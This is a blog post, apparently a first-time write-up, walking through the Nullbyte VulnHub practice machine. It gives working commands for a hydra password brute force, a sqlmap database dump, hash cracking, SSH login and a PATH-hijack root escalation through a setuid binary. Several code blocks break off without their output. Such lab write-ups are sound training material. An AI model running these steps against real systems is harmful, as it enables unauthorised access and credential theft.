First blog post. Lately I've been looking at ways to practice my skills as a pentester, and I figured CTFs and practice images would be the way to go. Something about [Vulnhub](https://www.vulnhub.com/) attracting my attention after examining the lot. I believe this is a great way to practice on skills I use everyday on engagements, but also to rehash some techniques rarely used. Personally, I don't find myself reverse engineering an executable on every gig :) Anyway, I figured I would take a swing at [Nullbyte](https://www.vulnhub.com/entry/nullbyte-1,126/) written by [lyon](https://twitter.com/@ly0nx).  Let's get started.

After loading the image, first batter up...nmap. 

```bash

We are working ssh on port 777, apache, and rpcbind. Apache first. I curl the website for the initial response. Not really necessary, more habitual. 

```bash
curl http://192.168.61.147/

<html>
<head><title>Null Byte 00 - level 1</title></head>
<body>
<center>
<img src="main.gif">
<p> If you search for the laws of harmony, you will find knowledge. </p>
</center>	

</body>
</html>

```

Basically just an image, lets see what we have. 

![Just an image?](/images/website.png)

Okay it's really just an image, nothing else it seems. Maybe theres something in the image. My first thought it either metadata or stegonagraphy. Metadata first. After searching the net I come across a tool called [exiftool](http://www.sno.phy.queensu.ca/~phil/exiftool/), which is a pretty neat as it extracts the meta information about an image. I'm sure it does alot more, but for the purposes of this test I just need to read the data.

```bash
./exiftool main.gif

```
Immediately the comment field jumps out, perhaps it's the "P-):"...winky face perhaps? Anyway, obviously we have a key to use. Given the webpage doesn't have any input fields, I figure why not try it as a directory. To my luck...success.

![use key as file path](/images/key.png)

Okay now we are working with something. Examining the source code of this site gives me the following hint. 

```
<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form> 
</center>
<!-- this form isn't connected to mysql, password ain't that complex --!>html

```

HTTP Post request, with a password that "ain't" that complex...so it's an easy password...brute force? I break out hydra. I'm not to familiar with hydra (I don't do much password cracking) so it took awhile to get the switches to work correctly.

```bash
hydra 192.168.61.147 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /usr/share/wordlists/rockyou.txt -la | tee nullbyte.hydra

```

This took about 30 seconds surprisingly, password is "elite". Which brings me deeper into the site. 

![Elite worked](/images/elite_success.png)

Entering anything into the parameter gives you the a successful data fetch of what I assume are usernames. Playing around with the input your provide will sometimes give you one or two usernames. This definitely smells like sql injection. Given this is a practice image, I'm was sure sqli would come into play at some point.

```bash
sqlmap -u "http://192.168.61.147/kzMb5nVYJw/420search.php?usrtosearch=x" | tee nullbyte.sql

Success! We could start enumerating the available databases, tables, etc. However, why not just dump everything? I append the "--dump-all" switch and [tee](http://linux.101hacks.com/unix/tee-command-examples/) the output. After the dump I do a search for ramses, and come across this. 

```bash
Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+

[17:24:09] [INFO] table 'seth.users' dumped to CSV file '/root/.sqlmap/output/192.168.61.147/dump/seth/users.csv'
```

There's a hash of some sort for ramses, but not for isis. It doesn't quite look like md5, sha256 perhaps? I don't know. For starters, I pipe it into Burp Suite Decoder and try out the options. After using the Base64 option I get a hash that looks more like a md5. Given it's most likely to be a password of some sort, on an Debian box, most likey md5. Hopefully it is. 

![Burp Decoder](/images/base64.png)

Okay great, now to crack it. We could use [john](http://www.openwall.com/john/), but [CrackStation](https://crackstation.net/) is much faster :) This gives us the password of 'omega'. I'm hoping that this will be the credentials for the SSH loggin. Let's give it a shot. 

```bash
ssh -l ramses -p 777 192.168.61.147
ramses@192.168.61.147's password:

Next clue, a program called procwatch in /var/www/backup. 

```bash
ramses@NullByte:~$ cd /var/www/backup
ramses@NullByte:/var/www/backup$ ls
procwatch  readme.txt
rramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD

 2209 pts/0    00:00:00 sh
 2210 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$
```

Alright so procwatch seems to just be listing the processes. There has to be something more to this. After trying a number of useless attempts, I decide to take a slightly deeper look into this file. 

```bash
ramses@NullByte:/var/www/backup$ ls -l procwatch 
-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
ramses@NullByte:/var/www/backup$ file procwatch 
procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped
ramses@NullByte:/var/www/backup$ 
```
Okay so we have an executable, that's running ps as root. Hmm. Okay since ps is really just a file in /bin, and $PATH sets the directories where executables can be found, I'm going to have to manipulate this environment variable. If I can get procwatch to run sh instead of ps, it should give me root shell :) I decide to copy the current shell executable (/bin/sh) into /tmp. I initially wanted to do ```cp /bin/sh /usr/local/bin/ps```  given /usr/local/bin was first on the list. Permission denied. Stupid decision I know. So end up prepending /tmp to $PATH, then running procwatch again. 

```bash
ramses@NullByte:~$ cp /bin/sh /tmp/ps
ramses@NullByte:~$ export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:~$ cd /var/www/backup
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```
Yes! Officially root. Now just grab the key and we are out of here!

```bash
# cd /root

That my friends is how it's done. For my first time, this was a excellent (although stressful) challenge. If you've stuck with me this far, thanks for hanging in there. I'll try to make future writeups more concise. Thanks to VulnHub for supplying and lyon for creating!
